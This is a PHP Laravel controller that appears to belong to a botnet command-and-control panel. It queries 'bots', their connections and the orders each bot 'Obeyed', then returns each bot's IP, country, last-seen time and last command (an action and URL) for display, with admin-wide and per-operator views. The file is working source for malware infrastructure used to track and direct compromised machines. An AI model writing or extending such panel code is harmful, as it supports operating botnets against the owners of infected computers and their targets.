<?php

namespace App\Http\Controllers;

use App\Bot;
use App\Connection;
use App\Obeyed;
use App\panelCredential;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class ConnectionsController extends Controller
{
    public static function mainConstructor($data){
        $take = $data['take'];
        $return = array();
        $seeMore = 0;

        //Get panel_credentials
        $panelCredential = Auth::user()->panelCredential()->first();

        //Get the bot_ids from the panel_credentials table!
        $bots = $panelCredential->bots()->get();

        if(Auth::user()->id === 1){
            //Admin!!
            $connections = Connection::orderBy('created_at', 'desc')->groupBy('bot_id')->take($take)->get();
            $connectionsAll = Connection::orderBy('created_at', 'desc')->groupBy('bot_id')->get()->count();
        }else{
            //Get the connections whereIn bot_id panel_credentials.bot_ids
            $connections = Connection::whereIn('bot_id',$bots->pluck('id'))->orderBy('created_at', 'desc')->groupBy('bot_id')->take($take)->get();
            $connectionsAll = Connection::whereIn('bot_id',$bots->pluck('id'))->orderBy('created_at', 'desc')->groupBy('bot_id')->get()->count();
        }

        //create ana array and send it to Js.
        $i = 0;
        foreach ($connections as $connection){
            //Get on the bot
            $bot = $connection->bot()->first();
            //Get the last order made by the bot!
            $obeyed = $bot->Obeyed()->orderBy('created_at','desc')->first();

            if($obeyed !== null){
                $command = $obeyed->order()->first();
                $lableName = 'url';
            }else{
                $command = ['action'=>'null', 'data'=>''];
                $lableName = '';
            }

            $return[$i] = [
                'bot_id'=>$connection->bot_id,
                'bot_ip'=>$bot->ip,
                'time_ago'=>$bot->connection()->orderBy('created_at','desc')->first()->created_at->diffForHumans(),
                'bot_command'=>'{<b class="dataJsonTitle" >action</b> : <b class="dataJsonLight" >'.$command['action'].'</b> , <b class="dataJsonTitle">'.$lableName.'</b> :<b class="dataJsonLight">'.$command['data'].'</b>}',
                'bot_country'=>$bot->country,
            ];

            $i++;
        }

        //SeeMore
        if($connectionsAll > $take){
            $seeMore = 1;
        }

        return ['data'=>$return,'seeMore'=>$seeMore];

    }
}
